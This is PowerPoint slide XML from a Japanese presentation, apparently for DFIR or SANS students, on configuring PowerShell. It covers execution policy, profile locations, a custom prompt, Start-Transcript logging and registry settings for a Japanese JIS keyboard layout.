                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>       Undefined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      Process       Undefined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  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>CurrentUser</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>       Undefined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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>LocalMachine</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>RemoteSigned</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49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6D177DF-9E81-9935-B0EB-FB27977116B6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="4041068"/>
            <a:ext cx="4850646" cy="10156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Set-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ExecutionPolicy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> `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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>RemoteSigned</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -Scope `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&gt;&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>CurrentUser</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -Force</a:t>
            </a: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A3D4B92A-DD62-345A-42BF-C6656A77A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993" y="5238449"/>
            <a:ext cx="4850645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spcAft>
                <a:spcPts val="600"/>
              </a:spcAft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各種設定。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1C1058E-3AA5-62DD-38F9-E604C08A9B33}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="5565430"/>
            <a:ext cx="4850646" cy="7078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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>PSReadlineOption</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2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&gt; Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>PSReadLineKeyHandler</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr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7840DF8F-9DC7-5781-5F0E-C4C78504C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4912" y="903347"/>
            <a:ext cx="5211008" cy="33855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spcAft>
                <a:spcPts val="600"/>
              </a:spcAft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プロファイルの格納場所。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="16" name="表 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F7213EE6-AE46-F4C6-551E-143FBB6D9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44360"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="6456363" y="1738888"/>
          <a:ext cx="4860925" cy="140208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611745">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2810130588"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="4249180">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="25036936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PS5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sz="2000" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="171717"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="SFMono-Regular"/>
                        </a:rPr>
                        <a:t>$HOME\Documents\</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ja-JP" sz="2000" b="0" i="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="171717"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="SFMono-Regular"/>
                        </a:rPr>
                        <a:t>WindowsPowerShell</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ja-JP" sz="2000" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="171717"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="SFMono-Regular"/>
                        </a:rPr>
                        <a:t>\Microsoft.PowerShell_profile.ps1</a:t>
                      </a:r>
                      <a:endParaRPr lang="ja-JP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215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PS7</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" dirty="0"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sz="2000" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="171717"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="SFMono-Regular"/>
                        </a:rPr>
                        <a:t>$HOME\Documents\PowerShell\</a:t>
                      </a:r>
                      <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2000" b="0" i="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="171717"/>
                        </a:solidFill>
                        <a:effectLst/>
                        <a:latin typeface="SFMono-Regular"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ja-JP" sz="2000" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="171717"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="SFMono-Regular"/>
                        </a:rPr>
                        <a:t>Microsoft.PowerShell_profile.ps1</a:t>
                      </a:r>
                      <a:endParaRPr lang="ja-JP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140647"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame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A6F2FCE-8AF6-3215-74EA-660D3EE1F5A4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6471181" y="1270177"/>
            <a:ext cx="4850646" cy="40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Write-Host $PROFILE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{161B620D-AA7B-1761-429C-6B8E9C7CD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4912" y="3310132"/>
            <a:ext cx="4842096" cy="677108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spcAft>
                <a:spcPts val="600"/>
              </a:spcAft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プロンプトを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2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行表示にするには、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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>以下を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$PROFILE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に記載する。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65CC9C2-7FB3-8C0C-EAD5-EF949A784535}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6460243" y="4030059"/>
            <a:ext cx="4857045" cy="20621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1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>function prompt {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>HOST.UI.Write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("Yellow", </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    $HOST.UI.RawUI.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>BackgroundColor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>,"PS ")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>HOST.UI.WriteLine</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("Green", </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>HOST.UI.RawUI.BackgroundColor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    (Get-Location).Path)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  "&gt; " </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP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024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AF22A3-8DF3-9274-664E-B6BB1BD2C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環境整備 </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>作業記録を出力する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2FCA026-9B4E-8F4C-4A92-23ADA27374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BE08298-ED0B-9100-934D-479E960664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54</a:t>
            </a:fld>
            <a:endParaRPr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310E1F9-F06E-0EE4-7529-EAB9053BB015}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="1376772"/>
            <a:ext cx="10430708" cy="1938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&gt; Start-Transcript -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>OutputDirectory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> "$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>env:OneDrive</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/Logs"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>トランスクリプトが開始されました。出力ファイル</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: C:\Users\swat\OneDrive - DFIRR/Logs\PowerShell_transcript.LNV2202.7ul7Tmwr.20230312030923.txt</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt; hostname</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt; Stop-Transcript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6D61DE50-C030-8A62-48DC-78EF252B6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992" y="3450486"/>
            <a:ext cx="4971847" cy="2416046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>
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft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コンピューター名と時刻を含む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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>ファイル名が付与される。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft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$profile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に書いておけば、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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>自動で記録が残される。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft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ログ保存先の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ACL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に気を払う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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>必要がある。</a:t>
            </a:r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21109DB4-9AD6-4C13-89EA-21ACC687B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20" y="961505"/>
            <a:ext cx="6768752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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Start-Transcript</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ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254D6C1-0DEB-85A7-A09E-B0EC1779AD7D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5951984" y="3460089"/>
            <a:ext cx="5268571" cy="31393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**********************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Windows PowerShell </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>トランスクリプト開始</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>開始時刻</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: 20230312030923</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ユーザー名</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: lnv2202\swat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. . .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PS&gt;hostname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lnv2202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PS&gt;Stop-Transcript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**********************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Windows PowerShell </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>トランスクリプト終了</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>終了時刻</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: 20230312031016</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36170903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AF22A3-8DF3-9274-664E-B6BB1BD2C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環境整備 </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>キーボード配列を日本語</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>JIS</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>にする（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>SANS</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>受講者向け）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2FCA026-9B4E-8F4C-4A92-23ADA27374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BE08298-ED0B-9100-934D-479E960664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55</a:t>
            </a:fld>
            <a:endParaRPr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310E1F9-F06E-0EE4-7529-EAB9053BB015}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="2708920"/>
            <a:ext cx="10430708" cy="22467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Set-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>WinUserLanguageList</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>LanguageList</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> ja-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>JP,en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-US -Force</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2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$Path = "HKLM:\SYSTEM\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>CurrentControlSet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>\services\i8042prt\Parameters"</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2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Set-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ItemProperty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -Path $Path -Name "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>LayerDriver</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> JPN" -Value "kbd106.dll"</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2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Set-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ItemProperty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -Path $Path -Name "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>OverrideKeyboardIdentifier</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>" -Value "PCAT_106KEY"</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Set-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ItemProperty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -Path $Path -Name "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>OverrideKeyboardType</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
